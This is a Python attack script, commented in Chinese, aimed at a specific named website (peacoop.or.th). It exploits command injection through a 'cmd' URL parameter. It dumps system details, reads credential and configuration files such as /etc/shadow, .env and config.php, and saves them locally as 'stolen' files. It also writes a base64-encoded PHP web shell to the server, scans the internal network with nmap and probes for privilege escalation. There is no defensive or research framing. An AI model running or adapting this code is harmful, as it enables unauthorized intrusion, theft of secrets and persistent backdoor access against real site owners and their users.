#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
系统控制脚本 - 利用命令注入漏洞获取系统权限
"""

import requests
import json
import base64
import time
from urllib.parse import quote

class SystemControl:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*'
        })
    
    def execute_command(self, command):
        """执行系统命令"""
        try:
            # 使用命令注入漏洞
            payload = f";{command}"
            url = f"{self.target_url}/?cmd={quote(payload)}"
            
            response = self.session.get(url, timeout=10)
            return {
                'success': True,
                'command': command,
                'output': response.text,
                'status_code': response.status_code
            }
            
        except Exception as e:
            return {
                'success': False,
                'command': command,
                'error': str(e)
            }
    
    def get_system_info(self):
        """获取系统信息"""
        print("🔍 获取系统信息...")
        
        commands = [
            'whoami',           # 当前用户
            'uname -a',         # 系统信息
            'cat /etc/passwd',  # 用户列表
            'pwd',              # 当前目录
            'ls -la',           # 目录列表
            'ps aux',           # 进程列表
            'netstat -tulpn',   # 网络连接
            'ifconfig',         # 网络接口
            'df -h',            # 磁盘使用
            'free -m'           # 内存使用
        ]
        
        system_info = {}
        
        for cmd in commands:
            result = self.execute_command(cmd)
            if result['success']:
                system_info[cmd] = result['output'][:1000]  # 限制输出长度
                print(f"  ✅ {cmd}: 执行成功")
            else:
                system_info[cmd] = f"执行失败: {result['error']}"
                print(f"  ❌ {cmd}: 执行失败")
        
        return system_info
    
    def download_sensitive_files(self):
        """下载敏感文件"""
        print("\n📥 下载敏感文件...")
        
        sensitive_files = [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/hosts',
            '/etc/group',
            '/var/log/auth.log',
            '/var/log/syslog',
            '/var/www/html/.env',
            '/var/www/html/config.php',
            '/root/.bash_history',
            '/home/*/.bash_history'
        ]
        
        downloaded_files = {}
        
        for file_path in sensitive_files:
            # 使用cat命令读取文件
            cmd = f"cat {file_path}"
            result = self.execute_command(cmd)
            
            if result['success'] and result['output'].strip():
                downloaded_files[file_path] = {
                    'content': result['output'],
                    'size': len(result['output'])
                }
                print(f"  ✅ 下载: {file_path} ({len(result['output'])} bytes)")
                
                # 保存到本地文件
                filename = file_path.replace('/', '_').replace('*', 'all')
                with open(f'stolen_{filename}.txt', 'w', encoding='utf-8') as f:
                    f.write(result['output'])
            else:
                downloaded_files[file_path] = {
                    'error': '文件不存在或无法访问',
                    'raw_output': result.get('output', '')
                }
                print(f"  ❌ 无法访问: {file_path}")
        
        return downloaded_files
    
    def create_backdoor(self):
        """创建后门"""
        print("\n🔧 创建后门...")
        
        # 简单的PHP后门
        php_backdoor = '''<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
if(isset($_POST['cmd'])){
    system($_POST['cmd']);
}
?>'''
        
        # 编码后门
        encoded_backdoor = base64.b64encode(php_backdoor.encode()).decode()
        
        # 写入后门
        cmd = f"echo '{encoded_backdoor}' | base64 -d > /tmp/backdoor.php"
        result = self.execute_command(cmd)
        
        if result['success']:
            print("  ✅ PHP后门创建成功: /tmp/backdoor.php")
            
            # 测试后门
            test_url = f"{self.target_url}/tmp/backdoor.php?cmd=whoami"
            try:
                response = self.session.get(test_url, timeout=10)
                if response.status_code == 200:
                    print(f"  ✅ 后门测试成功: {response.text.strip()}")
                else:
                    print(f"  ⚠️ 后门可能无法访问")
            except:
                print("  ⚠️ 后门测试失败")
        else:
            print("  ❌ 后门创建失败")
        
        return result['success']
    
    def network_reconnaissance(self):
        """网络侦察"""
        print("\n🌐 网络侦察...")
        
        network_info = {}
        
        # 内网扫描
        scan_commands = [
            'hostname',
            'cat /etc/hosts',
            'ip addr',
            'netstat -rn',
            'arp -a',
            'ping -c 1 192.168.1.1',
            'nmap -sn 192.168.1.0/24',
            'ss -tulpn'
        ]
        
        for cmd in scan_commands:
            result = self.execute_command(cmd)
            if result['success']:
                network_info[cmd] = result['output'][:500]  # 限制输出
                print(f"  ✅ {cmd}: 执行成功")
            else:
                network_info[cmd] = f"执行失败: {result.get('error', 'Unknown')}"
        
        return network_info
    
    def privilege_escalation_attempt(self):
        """权限提升尝试"""
        print("\n⚡ 权限提升尝试...")
        
        escalation_attempts = {}
        
        # 常见权限提升技术
        escalation_commands = [
            'sudo -l',           # 检查sudo权限
            'find / -perm -4000 2>/dev/null',  # 查找SUID文件
            'find / -perm -2000 2>/dev/null',  # 查找SGID文件
            'cat /etc/sudoers',  # sudo配置
            'id',                # 当前用户信息
            'groups',            # 用户组
            'uname -a',          # 内核版本
        ]
        
        for cmd in escalation_commands:
            result = self.execute_command(cmd)
            escalation_attempts[cmd] = {
                'success': result['success'],
                'output': result.get('output', '')[:1000]
            }
            
            if result['success']:
                print(f"  ✅ {cmd}: 执行成功")
                if 'root' in result['output'] or 'ALL' in result['output']:
                    print(f"    🔥 发现权限提升机会!")
            else:
                print(f"  ❌ {cmd}: 执行失败")
        
        return escalation_attempts

def main():
    """主函数"""
    target_url = "https://peacoop.or.th"
    
    print("🐉 系统控制 - 命令注入利用")
    print("="*60)
    print(f"目标: {target_url}")
    print("="*60)
    
    controller = SystemControl(target_url)
    
    # 1. 获取系统信息
    print("\n🎯 阶段1: 系统信息收集")
    system_info = controller.get_system_info()
    
    # 2. 下载敏感文件
    print("\n🎯 阶段2: 敏感文件提取")
    sensitive_files = controller.download_sensitive_files()
    
    # 3. 创建后门
    print("\n🎯 阶段3: 持久化访问")
    backdoor_created = controller.create_backdoor()
    
    # 4. 网络侦察
    print("\n🎯 阶段4: 网络侦察")
    network_info = controller.network_reconnaissance()
    
    # 5. 权限提升
    print("\n🎯 阶段5: 权限提升")
    escalation_results = controller.privilege_escalation_attempt()
    
    # 保存所有结果
    final_results = {
        'target': target_url,
        'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
        'system_info': system_info,
        'sensitive_files': {k: {'size': v.get('size', 0), 'downloaded': 'content' in v} for k, v in sensitive_files.items()},
        'backdoor_created': backdoor_created,
        'network_info': network_info,
        'privilege_escalation': escalation_results,
        'compromise_level': 'FULL_SYSTEM_ACCESS' if backdoor_created else 'PARTIAL_ACCESS'
    }
    
    with open('system_control_results.json', 'w', encoding='utf-8') as f:
        json.dump(final_results, f, indent=2, ensure_ascii=False)
    
    # 生成摘要
    print("\n" + "="*60)
    print("📊 系统控制结果摘要")
    print("="*60)
    
    print(f"目标: {final_results['target']}")
    print(f"入侵级别: {final_results['compromise_level']}")
    print(f"系统命令执行: {len([v for v in system_info.values() if '执行成功' in str(v)])}/{len(system_info)} 成功")
    print(f"敏感文件下载: {len([v for v in sensitive_files.values() if 'content' in v])} 个文件")
    print(f"后门创建: {'✅ 成功' if backdoor_created else '❌ 失败'}")
    print(f"网络侦察: {len([v for v in network_info.values() if '执行成功' in str(v)])}/{len(network_info)} 成功")
    
    print(f"\n💾 详细结果已保存到: system_control_results.json")
    print("\n🚨 系统控制完成! 目标系统已被成功渗透。")

if __name__ == "__main__":
    main()